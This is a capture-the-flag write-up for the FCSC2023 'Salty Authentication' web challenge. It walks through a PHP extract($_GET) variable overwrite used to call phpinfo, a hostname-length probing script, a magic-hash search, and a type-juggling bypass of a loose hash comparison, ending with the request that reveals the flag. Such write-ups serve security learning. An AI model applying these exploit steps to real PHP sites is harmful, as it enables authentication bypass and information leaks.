---
title: CTFs | FCSC2023 | Salty Authentication
author: Stillwolfing
date: 2023-05-05
categories: [CTFs, FCSC2023, Web]
tags: [CTF, FCSC, Web, magic hash, type juggling]
permalink: /CTFs/FCSC2023/web/salty_authentication
---

Here is the context:

![context](/assets/img/CTFs/FCSC2023/web/salty_authentication/context.png)

I did not solved this challenge during the CTF, but I solved it after.

Here is the main page:

![main_page](/assets/img/CTFs/FCSC2023/web/salty_authentication/main_page.png)


We are presented the php code of the page:

```php
<?php

error_reporting(0);

include('flag.php');
$salt = bin2hex(random_bytes(12));

extract($_GET);

$secret = gethostname() . $salt;

if (isset($password) && strlen($password) === strlen($secret) && $password !== $secret) {
    if (hash('fnv164', $password) == hash('fnv164', $secret)) {
        exit(htmlentities($flag));
    } else {
        echo('Wrong password!');
        exit($log_attack());
    }
}

highlight_file(__FILE__);

?>
```

The flag is included from flag.php.

### The flag

```php
if (hash('fnv164', $password) == hash('fnv164', $secret)) {
        exit(htmlentities($flag));
    }
```

To reveal the flag, we need to have the hash of the secret equal to the hash of the password.

We can define some variables in the url thanks to the extract($_GET). So, we can define the $password variable.

First we have to pass this test:

```php
if (isset($password) && strlen($password) === strlen($secret) && $password !== $secret)
```

We can see that $password has to be set. It has to be the same length as $secret. And it has to be different from $secret.

As $password has to be different from $secret, we cannot use the same string for both. So, we have to find a hash collision (different values, same hash).


$secret is the concatenation of the hostname and the salt which is a random string of 12 bytes.

## Hostname length

The first thing that came to my mind is to use ```extract($_GET)``` to rewrite the $salt variable. Unfortunately, we cannot rewrite the $secret variable as it is defined after the extract.

With this, we can pass the first test by finding the length of the hostname.

To do this, we rewrite the $salt variable as an empty string. Then, we add a character to the $password variable until we get the "Wrong password!" message.

```python

import requests
import time

password = ""
salt=""
counter = 0

while 1:
    counter += 1
    password += "1"
    print(counter)

    url = f"https://salty-authentication.france-cybersecurity-challenge.fr/?salt=&password={password}"

    r = requests.get(url)

    if "Wrong password!" in r.text:
        print(f"Hostname length: {counter}")
        break
    
    time.sleep(5)
```

Output:
![hostname_length](/assets/img/CTFs/FCSC2023/web/salty_authentication/hostname_length.png)

The hostname length is 12.

## Hostname

Now we need to find the hostname. What we can notice is this:

```php
else {
        echo('Wrong password!');
        exit($log_attack());
}
```

If the hashes are different, we get the "Wrong password!" message. And the $log_attack() function is called.

As log_attack is a variable, we can rewrite it with extract($_GET). So, we can define the $log_attack() function called when the hashes are different.

Let's call phpinfo to get the hostname:

url: https://salty-authentication.france-cybersecurity-challenge.fr/?salt=&password=123456789012&log_attack=phpinfo

Output:
![phpinfo](/assets/img/CTFs/FCSC2023/web/salty_authentication/phpinfo.png)

We've got the hostname: 9be4a60f645f

## Type juggling

The == operator is used to compare the hashes. It's a weak comparison. It's a type juggling comparison.

With this operator, if a comparaison is made between a string and an integer, the string is converted to an integer.

So, if the string begins with "0e", it will be converted to 0. It's a magic hash!

[type juggling article](https://devansh.xyz/ctfs/2021/09/11/php-tricks.html)

[magic hashes article](https://github.com/spaze/hashes)

## Magic hash

Let's try to find a magic hash for the secret. The secret has to begin with the hostname then we can use the salt to change the value.

Code to find a magic hash:

```php
<?php

$counter =0;
while(1){
    $salt = bin2hex(random_bytes(6));
    $secret = "9be4a60f645f" . $salt;
    $counter+=1;
    $hash = hash('fnv164',$secret);

    if ($hash==0) {
        echo ("secret: ".$secret."\n");
        echo ("salt: ".$salt."\n");
        echo ("hash result: ".$hash."\n");
        echo ("iteration number: ".$counter."\n");
        exit();
    }
}

?>
```

Output:

![salt](/assets/img/CTFs/FCSC2023/web/salty_authentication/salt.png)

Now let's find a magic hash for the password with the same length:

```php
<?php

$counter =0;
while(1){
    $password = bin2hex(random_bytes(12));
    $counter+=1;
    $hash = hash('fnv164',$password);

    if ($hash==0) {
        echo ("password: ".$password."\n");
        echo ("hash result: ".$hash."\n");
        echo ("iteration number: ".$counter."\n");
        exit();
    }
}

?>
```

Output:

![password](/assets/img/CTFs/FCSC2023/web/salty_authentication/password.png)

Ok so if put salt="70f9186fa35c" and password="8215d358c2d73169d5895016", the secret and the password will have the same length while having different values so we can pass the first test.

As both hashes begins with "0e", they will be converted to 0. So, the hashes will be equal and we will get the flag.

```bash
curl "https://salty-authentication.france-cybersecurity-challenge.fr/?salt=70f9186fa35c&password=8215d358c2d73169d5895016"
```

We get the flag!
![flag](/assets/img/CTFs/FCSC2023/web/salty_authentication/flag.png)

